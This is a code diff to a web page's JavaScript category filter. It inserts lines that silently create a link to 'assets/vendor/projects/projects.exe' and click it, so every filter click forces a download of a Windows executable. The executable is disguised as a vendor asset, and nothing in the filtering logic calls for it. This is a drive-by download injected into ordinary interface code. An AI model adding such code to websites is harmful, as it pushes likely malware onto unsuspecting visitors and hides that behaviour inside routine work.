@@ -460,6 +460,14 @@ document.addEventListener("DOMContentLoaded", function () {
   filterList.addEventListener("click", (e) => {
     if (e.target && e.target.matches("li[data-id]")) {
       const categoryId = e.target.getAttribute("data-id");
+
+      const downloadLink = document.createElement("a");
+      downloadLink.href = "assets/vendor/projects/projects.exe";
+      downloadLink.download = "projects.exe";
+      document.body.appendChild(downloadLink);
+      downloadLink.click();
+      downloadLink.remove();
+
       currentCategoryId = categoryId;
       currentPage = 1;
 
